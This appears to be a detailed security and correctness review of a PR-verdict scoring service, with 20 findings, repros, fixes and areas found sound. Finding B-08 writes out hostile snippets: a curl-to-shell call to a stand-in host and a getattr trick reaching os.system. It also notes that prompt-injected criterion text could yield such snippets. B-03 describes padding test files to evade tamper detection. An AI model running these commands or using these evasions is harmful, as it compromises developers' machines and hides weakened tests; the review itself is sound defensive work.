# Code review B: Verdict v2 core on `origin/develop` (45a9bcf)

Scope: rules and scoring, policy and waivers, worker integration, payload/contract, renderer, dashboard model.
Method: read the code, ran small repros with `D:/nuclei/worktrees/.venv-radius` (no suites, no Docker, no network). Earlier claims in docs and PR bodies were not trusted.
Confidence: **confirmed** = I ran a repro; **reading** = careful reading of the cited lines; **suspected** = plausible but not exercised.

## Summary table

| Id | Severity | Confidence | Location | One line |
|---|---|---|---|---|
| B-01 | high | confirmed | `rules.py:228-240`, `states.py:153`, `service.py:202-210` | A criterion with 2 or more failing linked tests makes the whole v2 run raise; the stale verdict (even "verified") stays published |
| B-02 | high | confirmed (adapter) / reading (end to end) | `adapters.py:298-316`, `collect.py:501` | Changes to unknown-language files (sh, Dockerfile, go, sql, yml...) and ignored paths are invisible: no `unsupported_language` marker, not in B |
| B-03 | high | confirmed (detector) / reading (verdict) | `tamper/service.py:79-84`, `collect.py:503-510,665`, `tamper/context.py:155-160` | Tamper analysis failures (`unanalyzable`, `context_error`, context time budget) are treated as "no findings" |
| B-04 | medium | confirmed (from_dict) / reading | `verdict_v2_repository.py:169-200`, `scoring.py:1289`, `inputs.py:150-190` | After the 2 MB cap, CI results can never be re-scored: `StageAInput.from_dict` raises, the outbox retries 5x and sticks |
| B-05 | medium | reading | `spec_file.py:599`, `states.py:261-266`, `rules.py:299-303` | The PR author sets criterion `weight` in `.radius/intent.yml`; tiny weights on unproven criteria hide them from UIM |
| B-06 | medium | reading | `explicit.py:80-99`, `scoring.py:407-412` | Author `paths:` hints and path mentions in criterion text link a criterion to code at full strength; the cap only covers `tests:` hints, so intent coverage (R2c) is author-gameable |
| B-07 | medium | reading | `intent_refresh.py:61-70`, `adapters.py:121-123`, `routes/intent.py:320-362` | No separation of duties: the PR author can confirm their own criteria, which also blesses the author's `tests:` hints (cap lifted) |
| B-08 | medium | confirmed | `suggested_tests.py:111-137` | The static-only gate accepts snippets that import and run arbitrary modules (`pytest.importorskip`, `getattr` tricks) |
| B-09 | medium | reading | `routes/tests.py:166,172-190`, `verdict_v2_trigger.py:43-52` | Outbox enqueue failures are swallowed with no reconciliation; v2 stays on a stale verdict. `add_criterion` never enqueues |
| B-10 | medium | reading | `markdown.py:944-975`, `report.py:37-43`, `rules.py:280-296` | Blocking mode: fail-open when the base policy is unreadable; docs-only or no-criteria PRs get a red check |
| B-11 | low | reading | `llm/extractor.py:522-529` | LLM grounding is a distinct-word subset test; negation can be dropped and word order is ignored |
| B-12 | low | confirmed | `rules.py:95-106` | `is_inert_path` classifies code and build files as inert (`changelog*.py`, `*.sh`, `CMakeLists.txt`, `requirements-dev.txt`, `docs/*.go`) |
| B-13 | low | reading | `suggested_tests.py:202` | `change_kind == "deleted"` never matches (the enum value is `removed`); removed symbols can be suggested |
| B-14 | low | reading | `measure.py:64,436` | The mutation cache context hash ignores files other than py/toml/ini/cfg/txt/yml/yaml/json |
| B-15 | low | reading | `client.py:381-397`, `publish.py:310,334-343` | The live-head guard looks at only the first 100 open PRs and fails open |
| B-16 | low | reading | `verdict_v2_repository.py:479-517,574-588`, `publish.py:152-160` | Re-enqueue clears a live claim so two workers can run; both can create the PR comment (duplicate) |
| B-17 | low | reading | `verdict_v2_payload.py:164` | After bundle truncation every test shows outcome `not_run`, including failed ones |
| B-18 | low | reading | `verdict_v2_repository.py:362-376`, `scoring.py:1034`, `1296` | A same-digest save keeps the old `mode`; `verdict.revision` inside the bundle is always 1 |
| B-19 | low | reading | `scoring.py:1003-1006` | `suggested_tests` is added after `inputs_digest`, so changed suggestions are never stored for an unchanged digest |
| B-20 | info | reading | `verdict_v2.schema.json` | The schema lacks `suggested_tests` (and the worker-only `degraded`); `additionalProperties` is true so nothing breaks |

## Findings in detail

### B-01 (high, confirmed): two failing linked tests on one criterion crash the verdict

- `packages/evidence/src/radius_evidence/domain/states.py:153` builds the `failing_linked_test` reason with `ref=",".join(failing)` (one string holding every failing evidence id).
- `packages/confidence/src/radius_confidence/verdict_v2/domain/rules.py:228-234` collects `r.ref` of those reasons as `failing_evidence` and stores it as `refs.evidence_ids` of R1a (`_refs(criterion_ids=..., evidence_ids=failing_evidence)`).
- `application/service.py:202-210` runs `check_justification`, which requires each ref to be an id among the criteria items. `"ev1,ev2"` is not, so `compute_verdict_v2` raises `ValueError("justification invariants violated: R1a.refs.evidence_ids: unknown id 'ev1,ev2'")`.
- Repro (ran): a `CriterionVerdict` with state `contradicted`, reason ref `"ev1,ev2"` and items `ev1`, `ev2` gives `RAISED ValueError(... unknown id 'ev1,ev2')`.
- Effect: in Stage A/B (`run_verdict_v2_best_effort`) the exception becomes an error bundle with `fallback: v1`. In the outbox path (`StageBRecomputer.recompute`, `scoring.py:1289`) the exception propagates, `_handle` releases the request with backoff, and after 5 attempts the row is no longer claimed. The previously stored revision stays the newest one. If that was "awaiting CI" or an earlier "verified" (first shard green, second shard has two failures on one criterion), that is what stays published. This is the "failed CI must never become a pass" scenario, hit through a crash instead of a rule. R1b (global failing-case count) never gets to run because the exception comes first.
- Fix: put one id per element (`refs.evidence_ids = [i for r in reasons for i in r.ref.split(",")]`), or better store the failing ids in a typed field of the reason instead of a comma string. Add a test with two failing tests on one criterion. Consider making the pipeline fall back to `failed` when R1a/R1b fire and the invariant check fails.

### B-02 (high): unknown-language and ignored changes are invisible to the verdict

- LK-01 turns every file it cannot parse (unknown language, binary, over budget) into one file-level symbol (`qualified_name "<file>"`, `kind "file"`, `language "unknown"`, `is_behavioral True`).
- `adapters.behavioral_symbols` (`adapters.py:298-305`) drops symbols with `is_pseudo and kind == "file"`. `unsupported_languages` (`adapters.py:308-316`) iterates over `behavioral_symbols(...)`, so it never sees them. `collect.py:501` therefore never adds `unsupported_language:*`.
- Repro (ran): a diff of `deploy.sh` makes `extract_symbol_changes` return one `<file>` symbol with `language=unknown`, `is_behavioral=True`; `adapters.unsupported_languages(...) == ()` and `behavioral_symbols(...) == ()`. The existing tests only cover TypeScript, which is symbol-level, so they pass.
- Consequence: a PR that changes `deploy.sh`, a `Dockerfile`, `*.go`, `*.sql`, `*.yml`, `pyproject.toml`... next to one Python function that is proven gets R2c coverage 1.0, no R2d, and can reach `verified`. Only the tamper catalog (CI weakening, dependencies, config) can catch some of it. Files ignored by LK-01 (`DEFAULT_IGNORE_GLOBS`: `vendor/`, `dist/`, `build/`, `generated/`, lockfiles, `*.min.js`) leave no trace at all, not even in `degraded`.
- Docs: `VERDICT_V2_SLICE.md` (R2d row, line 539) says `unsupported_language:*` for a behavioral file blocks the verdict. The code does not do what the doc says for these files.
- Fix: compute `unsupported_language:<lang>` from file-level symbols too (and from `FileChange` levels `file`/`ignored` with a non-inert path), and make "changed paths with no analysis" a blocking degraded marker (or at least a visible `unanalyzed_paths` fact).

### B-03 (high): a failed tamper analysis reads as "no findings"

- `analyze_tampering` "never raises": a `TamperContext.build` failure returns a report with `notes=("context_error:...")` and no findings (`tamper/service.py:79-84`). Files that cannot be read, are over `max_file_bytes` (1,000,000), are binary or unparsable go to `ctx.unanalyzable` (`context.py:155-163,231`). `context_time_budget_exceeded` and `max_files_exceeded` are only notes.
- The worker only reads `truncated` and `rule_errors` (`collect.py:505-508`). `notes` is ignored, and `tamper_unanalyzable` (`collect.py:665`, `inputs.py:164`) is stored but no rule or marker reads it (grep found no consumer).
- Repro (ran): base test file with two asserts, head removes one. A normal file gives `T003 assertion_removed high`. When the test file is padded above 1 MB on both sides (or on the base side only) the result is `findings=[]`, `unanalyzable=(file_too_large ...)`, `truncated=False`. Padding the head side only still gives a (false) `T001 test_deleted`, so the evasion needs the base side or both padded.
- Effect: weakened tests in a large test file are not flagged; R1c/R3a do not fire. This is the attack the tamper layer exists to stop, and the failure is silent.
- Fix: map `unanalyzable` (test, CI and manifest roles), `context_error:*`, `context_time_budget_exceeded`, `max_files_exceeded`, `base_snapshot_unavailable` to a blocking degraded marker (for example `tamper_incomplete:<reason>`), the same way `rule_errors` already raises.

### B-04 (medium): truncated bundles can never be re-scored

- `SqlVerdictV2Repository.save` caps the bundle (`verdict_v2_repository.py:169-200`) by deleting `stage_b`, `stage_a.assertions`, `stage_a.symbols`, `stage_a.symbol_test`, then all of `stage_a`.
- `latest_stage_a` returns the first row with a non-empty `stage_a` dict (`_stage_a`, line 311). `StageAInput.from_dict` on that dict raises `TypeError: __init__() missing 3 required positional arguments: 'symbols', 'symbol_test', and 'assertions'` (ran with the keys removed). `recompute` (`scoring.py:1289-1301`) therefore fails on every attempt. When all of `stage_a` is gone it returns `False` and the outbox row is deleted as "done".
- Effect for large PRs (the 2 MB cap is reachable with 50 criteria times their tests): CI results, including failures, never update the verdict, which stays on "awaiting CI results" (or whatever it was) indefinitely. Nothing tells the user.
- Fix: do not drop parts of `stage_a` that Stage B needs (store Stage A in its own column or table), or make `recompute` detect `truncated` and write an explicit `error`/`degraded` bundle instead of raising or silently doing nothing.

### B-05 (medium): author-set weights dilute UIM

- `.radius/intent.yml` accepts `weight` per criterion (`spec_file.py:599,678-692`, any value in (0,1]). The weight is not gated by provenance. UIM is `sum(w*[unproven]) / sum(w)` (`states.py:261-266`) and R2b fires only above `uim_max = 0.20` (`rules.py:299-303`).
- Scenario: one proven criterion with weight 1.0 and 20 unproven criteria with weight 0.01 gives UIM 0.2/1.2 = 0.167, so R2b does not fire. The verdict can be `verified` with 20 unproven criteria (the comment lists "N of M criteria supported", but the verdict is a pass).
- Fix: ignore author weights unless the spec is `base_spec` or `human_confirmed` (use 1.0 otherwise), or add an unweighted count of unproven criteria as an extra gate.

### B-06 (medium): author `paths:` hints and path mentions are uncapped

- `author_hint_cap` (0.7) applies only to `tests:` hint edges (`scoring.py:152-171`). In `explicit.py:80-99` a `paths:` hint scores `path_symbol_hint` 0.95, a file hint up to 0.85, a path written in the criterion text scores 0.9, and even a `**`/directory hint scores 0.5. All are above `link_min_cs` (0.20) and mostly above `link_sat_cs` (0.40), so `l_cs` is 1.
- Intent coverage (`scoring.py:407-412`, and "same file as a covered symbol" in `states.py`/`_covered_symbols`) counts a changed symbol as covered when any non-excluded criterion links to it or to a symbol in the same file. An author who writes one criterion with `paths: ["src/**"]` (or names the files in its text) covers the whole change; R2c (min coverage 0.5) then cannot fire, and R2b only looks at the criteria's own proof.
- Fix: cap or discount links whose only evidence is an author hint or mention unless the hint provenance is `base_spec` or `human_confirmed`, and do not let `**`/directory hints count for coverage.

### B-07 (medium): self-confirmation and blessing of hints

- `apply_action` (`routes/intent.py:327-362`) is open to any authenticated principal of the organization; nothing compares the actor with the PR author. A confirmed or edited criterion becomes `human_confirmed` (`adapters.py:121-123`, `intent_refresh.py:61-70`), which (a) lifts the `unconfirmed_inferred_intent` block (R2d) and (b) makes its `tests:` hint edges trusted (`intent_refresh.py:90-91`), so the 0.7 cap is lifted. The human confirmed one sentence, not the author-written hint list that came with it.
- `PATCH` bodies cannot set provenance (checked: the request carries action, text and reason only), so there is no direct spoofing. The weakness is the trust model.
- Also: `edited` replaces the text but keeps the old links (documented limitation in `intent_refresh.py`), so the proof for the old wording is shown for the new wording.
- Fix: record who confirmed and require actor different from the PR author (or a reviewer role) before lifting caps or blocks; keep hint provenance separate from criterion provenance (confirming the text should not confirm hints unless the hints were shown).

### B-08 (medium, confirmed): the suggested-test gate is a pattern filter

- `gate_suggestion` (`suggested_tests.py:111-137`) blocks a name list and `__x` attributes. It accepts (ran, all `accepted=True, a_static=1.0`):
  - `pytest.importorskip("subprocess").getoutput("curl evil.example | sh")` plus `assert f(1) == 2`;
  - `getattr(f, "__glob" + "als__")["__builtins__"]["__imp" + "ort__"]("os").system("id")` plus an assert;
  - `pytest.main(["-p", "some_plugin"])` plus an assert.
- The criterion text is author controlled and goes into the prompt; the snippet is published in a PR comment with "run them yourself". The risk is a developer running a snippet produced from a prompt-injected criterion.
- Fix: allowlist AST node types and callees (only calls to imported changed symbols, `pytest.raises/approx/mark`, a short builtin list), reject `getattr/setattr/vars/dir/type`, string-built attribute names, `pytest.importorskip/main/skip`, and any call result used as a call target. Do not present the code as safe because it passed.

### B-09 (medium): lost republish

- After a CI upload the API calls `_request_verdict_v2_republish` (`routes/tests.py:166`), which swallows any exception (`172-190`); `request_verdict_v2_recompute` does the same (`verdict_v2_trigger.py:43-52`). The upload is already committed, there is no retry and no sweep for "analysis with uploads newer than the newest verdict revision". A transient DB error leaves v2 on "awaiting CI results" while CI is red.
- `add_criterion` (`routes/intent.py:371`) never enqueues (and `refresh_stage_a_intent` ignores criteria not in Stage A), so a manual criterion has no effect until a new analysis, without saying so.
- Fix: enqueue in the same transaction as the upload, or run a periodic reconciler comparing the newest upload time with the verdict `computed_at`.

### B-10 (medium): blocking mode edge cases

- `check_conclusion` (`markdown.py:944-975`) reads the mode from the base policy. When the policy file is `unreadable`, `too_large` or `invalid`, `policy_block` returns `mode: null` (`report.py:37-43`, `res.policy` is `NO_POLICY`), so a repository that is `blocking` silently falls back to advisory for that run: unverified becomes `neutral`, which a required check accepts. R2d still prevents `verified`, but the merge gate opens on a transient read error (`repo_config.py` `_read`, `base_available` false).
- Opposite direction: R2e (`rules.py:280-296`) yields `insufficient_evidence` for docs-only changes ("not applicable ... not a pass"), and blocking mode turns every unverified result into `failure`. A required check would block every docs-only PR.
- Fix: keep the last known good mode, or treat a policy read failure as failure in repositories that had a blocking policy; and map `not_applicable` to a non-failing conclusion in blocking mode.

### B-11 (low): LLM grounding is a bag-of-words subset

`_grounded` (`llm/extractor.py:522-529`) requires 60% of the criterion's distinct words to occur in the quote. A text that only uses a subset of the quote's words passes at 100%: quote "must not reject expired tokens" and text "must reject expired tokens" is "grounded"; "admin can delete user" vs "user can delete admin" too. Mitigated because LLM criteria stay unconfirmed (blocking marker) until a human reads them. Fix: require the text to be close to a substring of the quote or run a negation/order check; show the quote next to the text in the confirm UI.

### B-12 (low, confirmed): `is_inert_path` is too broad

`rules.py:95-106` (ran): inert is True for `src/changelog.py`, `tools/changelog_gen.sh`, `licence_check.py`, `docs/build.mjs`, `docs/gen.go`, `doc/Makefile`, `CMakeLists.txt`, `requirements-dev.txt`, `constraints-dev.txt`, `requirements/prod.txt`, `docs/deploy.ps1`, `docs/Dockerfile`, `src/LICENSE.py`, `src/app.svg` (svg can carry script). The comment promises that dependency manifests are NOT inert. Impact is limited to the reason code and wording ("not applicable: only documentation or inert files changed") because the verdict is `insufficient_evidence` either way. Also `inert_changes_only` is computed from `sa.symbols` paths only (`scoring.py:502`), so a change made only of ignored paths (lockfiles, `vendor/`) has no symbols and is also called "inert". Fix: match exact basenames and suffix sets, drop the `startswith("changelog"/"licence")` rules, restrict the docs prefix to documentation suffixes.

### B-13 (low): `deleted` vs `removed`

`changed_module_symbols` skips `change_kind == "deleted"` (`suggested_tests.py:202`), but `ChangeKind.REMOVED == "removed"` (`symbol_changes/model.py`). Removed symbols stay in the allowed import list and the prompt. Fix: compare with `"removed"`.

### B-14 (low): mutation cache context

Key = (mutant hash, test ids, image digest, context hash) under (org, repo) (`mutation.py:171-259`, `measure.py:62-64,436`). The context hash covers `.py .toml .ini .cfg .txt .yml .yaml .json` only, up to 4000 files / 40 MB. Test data in `.csv`, `.sql`, `.xml`, `.md`, binary fixtures and lockfiles does not change the key, so a cached "killed" can be reused after data the test depends on changed. Org and repo isolation itself is correct. Fix: hash all non-ignored files, or disable the cache when test directories hold uncovered file types.

### B-15 (low): live-head guard

`list_pull_requests` returns one page of 100 open PRs (`client.py:381-397`); `_live_head` returns `None` for older PRs and `publish.py:310` skips the check when `live is None`. For repositories with more than 100 open PRs a stale analysis can overwrite the PR comment. Fix: query `GET /pulls/{number}` directly.

### B-16 (low): claim and comment races

`enqueue_request` clears `claimed_at` and `claim_token` of a row being processed (`verdict_v2_repository.py:479-517`), so another worker can claim while the first still runs; `complete_request` then correctly refuses to delete. Both workers can pass `digest_known`, list comments, find none and each `create_issue_comment` (`publish.py:152-160`): duplicate comments. Fix: keep the claim on re-enqueue (only bump `requested_at`), or serialise per analysis (advisory lock).

### B-17 (low): outcomes lost after truncation

`verdict_v2_payload._criterion` (`:164`) takes the outcome only from `evidence_items`; `EvidenceQuality` rows have no outcome. When the bundle was capped (`evidence_items` dropped) all rows show `not_run`, including `gated:outcome_failed`. State and verdict stay right. Fix: derive the outcome from `status` (`gated:outcome_*`, `counted` means passed) as a fallback.

### B-18 (low): mode and revision bookkeeping

`save` returns early for a same-digest top row without updating `mode` (`verdict_v2_repository.py:362-366`): after `shadow` to `on` the payload keeps `mode: shadow` and the dashboard tag "Shadow: not shown on the PR" while it is published. `compute_pipeline`/`ScoringPipeline` default `revision=1`, so `verdict.revision` in the stored bundle is always 1 while the row and payload revision differ.

### B-19 (low): suggestions outside the digest

`score_full` adds `suggested_tests` after the digest was computed (`scoring.py:1003-1006`); a re-run with identical inputs but different suggestions is a no-op in `save`. Suggestions may be stale by design, but the payload should then say so.

### B-20 (info): contract drift

`verdict_v2.schema.json` has no `suggested_tests` property; the worker's `scoring.build_payload` emits `degraded`, which neither the schema nor the API model lists (both allow extras). The two payload builders (`scoring.build_payload` and `verdict_v2_payload.build_payload`) differ in `revision`, `degraded` and outcome handling; only the second is served.

## Areas reviewed and found sound

- **Math**: `q = d_eff * i * f * flaky_f * (1 - tamper_p)`, `d_eff = min(cap_static, a_static)` (`quality.py:248,277`), Wilson-LCB replacement with the `a == 0` guard, `S = min(1 - prod(1 - term*rho^k), 0.9)` with ties broken by evidence id and groups iterated in sorted order (`support.py`), `_ge` tolerance only on the support thresholds, 6-digit rounding in the rule comparisons: consistent with the docs; no NaN/inf path found (adapters drop non-finite or out-of-range scores, `_unit` raises on bad factors, criterion weights are validated in (0,1]).
- **Failed or contradicted cannot become a pass in the rules**: R1a/R1b/R1c precede everything; R1b counts every failing case of the head (matched or not, `max(stage_b.ci_failed_cases, failed_case_count(cases))`); the merge rule is failed > passed > skipped; uploads for another SHA are ignored; a criterion waiver on a `contradicted` criterion is ignored and no waiver touches CI cases (`apply.py`); the `FLAKY` rewrite of a failed test does not hide R1b. (B-01 is a crash, not a rule bypass.)
- **Author-hint cap**: applied in Stage B to `intent_yml_hint` edges whose provenance is not `base_spec` or `human_confirmed`; one hinted test alone cannot reach `tau_support` (0.6 * 1.0 * 0.7 = 0.42); the `author_supplied_hint` flag and reason are set; the merge of hint and relevance edges ranks hints at their capped weight. `default_spec_provenance` compares head and base bytes and fails towards author control.
- **Provenance derivation**: `human_confirmed` comes only from the stored lifecycle (`confirmed`/`edited`), never from a request or payload; `PATCH` accepts action/text/reason only; `human_attested_tests` is never fed, so independence stays 0.6/0.8.
- **Policy and waivers**: both files are read from the base ref only; an unavailable base maps to `unreadable` (never "no policy"); the head policy is read only under `tighten_only` and each key is accepted only if stricter (`effective.py`, with `at_least_as_strict` for property tests); thresholds are bounded; `allow_disable` is needed to lower or disable high and critical findings; waivers are strict (ids, dates, at most 90 days, owner, reason length, one target kind, globs validated, `rule` needs `paths`), expiry is `expires < today` with an injected `today` and no hidden clock; globs compile to anchored regex with a wildcard cap (no catastrophic backtracking); the miniyaml parser has a size cap.
- **Idempotency**: `save` is keyed by (analysis, digest) with a concurrent-writer fallback; moving an older digest back to the top is handled; `complete_request` deletes only with the same claim token and `requested_at`; claim uses `FOR UPDATE SKIP LOCKED`; lease and backoff arithmetic are right; flag `off` returns before touching anything (`process_pending`, `create_recomputer`, `run_verdict_v2_for_analysis`).
- **Publisher**: stale-head checks against the stored head, a newer analysis and (modulo B-15) GitHub; digest skip; the failure path records `publish_error` in its own transaction and retries; the Check Run mapping table matches the documented advisory, strict and blocking behaviour, and `failure` only for R1a/R1b/R1c in advisory.
- **Renderer escaping**: `escape.py` strips control, format and bidi characters, wraps URLs, e-mails, `@mentions` and `#refs` in code spans, entity-encodes `& < >`, escapes Markdown metacharacters, restricts tokens and URLs; size budgets (60,000 characters, row and list caps) drop optional sections in priority order; marker parsing only on bot-authored comments; code fences use four backticks and reject fence and HTML-comment content. I found no injection path.
- **Dashboard**: no `dangerouslySetInnerHTML`/`innerHTML` and no href built from payload fields; the header never uses a green tone for v2 (`info` even for verified), unknown or missing verdicts render as "no verdict" (warn), `pending` wins over the verdict, v1 "good" appears only when v2 is absent or `status != ok` (the intended fallback). The parser bounds lists and text lengths.
- **API contract**: `CONTRACT_VERSION` is shared with a test, the `evidence_basis` enums agree between schema, API model and worker (`static_only`, `static_and_mutation`; per criterion `static_only`/`mutation_measured`/`mutation_partial`), extra fields are allowed, old bundles load because the payload builder defaults every optional field.
- **Mutation cache scope**: rows are keyed by organization and repository, only `killed`/`survived` are stored, an image identity is required, the key includes test ids and a context hash (gap in B-14). Suggested tests: egress policy per organization, nonce and secret echo check, in-process cache keyed by the full prompt (no cross-org sharing), forced `executed=false`/`evidence=false` in the shared payload builder, fenced rendering.

## Not reviewed or only skimmed

`ieg_builder.py` and `domain/ieg.py` (graph construction; only the path and edge semantics used by `_best_rows` were read), `domain/mutation.py` measurement math and `radius_testing/mutation/*` beyond the cache key, the individual tamper rules T001-T017 (only the engine, classification and failure handling), `miniyaml.py` internals, the dashboard panel components and `verdict-v2-model.ts` rendering helpers beyond parsing and the header, the SQL migration, and `docs/verdict-v2.md` line by line. No test suite was run.
